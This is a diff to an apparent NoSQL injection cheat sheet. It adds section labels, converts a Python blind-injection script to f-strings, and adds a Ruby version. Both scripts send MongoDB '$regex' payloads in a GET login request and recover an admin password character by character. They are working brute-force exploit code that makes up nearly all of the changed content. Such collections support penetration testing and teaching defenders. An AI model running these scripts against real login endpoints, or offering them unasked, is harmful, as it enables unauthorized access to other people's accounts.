@@ -11,6 +11,7 @@
   * [Extract data information](#extract-data-information)
 * [Blind NoSQL](#blind-nosql)
   * [POST with JSON body](#post-with-json-body)
+  * [POST with urlencoded body](#post-with-urlencoded-body)
   * [GET](#get)
 * [MongoDB Payloads](#mongodb-payloads)
 * [References](#references)
@@ -84,6 +85,7 @@ Extract data with "in"
 
 ### POST with JSON body
 
+python script:
 
 ```python
 import requests
@@ -109,6 +111,8 @@ while True:
 
 ### POST with urlencoded body
 
+python script:
+
 ```python
 import requests
 import urllib3
@@ -133,6 +137,8 @@ while True:
 
 ### GET
 
+python script:
+
 ```python
 import requests
 import urllib3
@@ -147,11 +153,38 @@ u='http://example.org/login'
 while True:
   for c in string.printable:
     if c not in ['*','+','.','?','|', '#', '&', '$']:
-      payload='?username=%s&password[$regex]=^%s' % (username, password + c)
+      payload=f"?username={username}&password[$regex]=^{password + c}"
       r = requests.get(u + payload)
       if 'Yeah' in r.text:
-        print("Found one more char : %s" % (password+c))
+        print(f"Found one more char : {password+c}")
         password += c
+```
+
+ruby script:
+
+```ruby
+require 'httpx'
+
+username = 'admin'
+password = ''
+url = 'http://example.org/login'
+# CHARSET = (?!..?~).to_a # all ASCII printable characters
+CHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'
+GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
+session = HTTPX.plugin(:persistent)
+
+while true
+  CHARSET.each do |c|
+    unless GET_EXCLUDE.include?(c)
+      payload = "?username=#{username}&password[$regex]=^#{password + c}"
+      res = session.get(url + payload)
+      if res.body.to_s.match?('Yeah')
+        puts "Found one more char : #{password + c}"
+        password += c
+      end
+    end
+  end
+end
 ```
 
 ## MongoDB Payloads
